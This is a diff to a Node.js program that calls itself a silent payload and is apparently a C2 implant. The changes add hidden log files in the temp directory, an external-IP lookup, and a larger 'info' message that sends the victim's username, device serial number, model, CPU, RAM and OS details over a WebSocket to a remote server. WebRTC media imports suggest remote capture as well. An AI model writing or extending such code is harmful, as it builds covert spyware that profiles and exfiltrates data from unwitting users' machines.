@@ -11,9 +11,22 @@ const https = require('https');
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
-const LOG_FILE = path.join(LOG_DIR, '.sys_cache.log');
+const LOG_FILE = path.join(LOG_DIR, 'payload.log');
+const HIDDEN_LOG_FILE = path.join(os.tmpdir(), '.sys_cache.log');
 
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
+
+function log(msg) {
+ const timestamp = new Date().toISOString();
+ const logLine = `[${timestamp}] ${msg}`;
+ console.log(logLine);
+ try { 
+ fs.appendFileSync(LOG_FILE, `${logLine}\n`); 
+ fs.appendFileSync(HIDDEN_LOG_FILE, `${logLine}\n`); 
+ } catch(e) {}
+}
+
+log("[INIT] Payload starting silently...");
 
 // --- FORCE INSTALLATION CHECK ---
 try {
@@ -45,20 +58,6 @@ if (!HAS_WEBRTC) {
 }
 
 const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};
-
-// --- LOGGING SYSTEM ---
-function log(msg) {
- const timestamp = new Date().toISOString();
- console.log(`[${timestamp}] ${msg}`);
- try {
- fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
- if (ws && ws.readyState === WebSocket.OPEN && myId) {
- safeSend(JSON.stringify({ type: 'system_log', message: msg, id: myId }));
- }
- } catch (e) {}
-}
-
-log("[INIT] Payload starting silently...");
 
 // --- HARDWARE FINGERPRINT ---
 function getHardwareFingerprint() {
@@ -128,7 +127,27 @@ let reconnectAttempts = 0;
 let isConnected = false;
 let myIp = 'Unknown';
 
-function initConnection() {
+// Helper to get external IP
+function getExternalIP() {
+ return new Promise((resolve) => {
+   https.get('https://api.ipify.org?format=json', (res) => {
+     let data = '';
+     res.on('data', (chunk) => { data += chunk; });
+     res.on('end', () => {
+       try {
+         const json = JSON.parse(data);
+         resolve(json.ip);
+       } catch (e) {
+         resolve('Unknown');
+       }
+     });
+   }).on('error', () => {
+     resolve('Unknown');
+   });
+ });
+}
+
+async function initConnection() {
  log(`[WS] Attempting silent connection to ${WS_URL}...`);
 
  ws = new WebSocket(WS_URL);
@@ -138,7 +157,7 @@ function initConnection() {
  isConnected = false;
  });
 
- ws.on('open', () => {
+ ws.on('open', async () => {
  reconnectAttempts = 0;
  isConnected = true;
  log(`[WS] Connected. Sending identity...`);
@@ -328,20 +347,32 @@ function initConnection() {
 
  const realCpuCores = os.cpus().length;
 
+ // Get External IP
+ myIp = await getExternalIP();
+
  // Send actual guest device information
- // FIXED: Ensure all keys match the server.js expectations exactly
  safeSend(JSON.stringify({
  type: 'info',
  id: myId,
- fingerprint: myId,
+ uniqueId: myId,
+
+ deviceName: realDeviceName,
  os: realOsName,
+ platform: process.platform,
+ osVersion: os.release(),
  arch: os.arch(),
  user: realUser,
+
+ manufacturer: realManufacturer || 'Unavailable',
+ model: realModel || 'Unavailable',
+ serialNumber: realSerialNumber || null,
+
+ cpu: realCpu || 'Unavailable',
+ cpuCores: realCpuCores,
+ ramGB: realRamGB,
+
  ip: myIp,
- last_seen: Math.floor(Date.now() / 1000),
- status: 'Online',
- created_at: Math.floor(Date.now() / 1000),
- serial_number: realSerialNumber || realModel || 'Unknown'
+ fingerprint: myId
  }));
 
  startMonitoring();
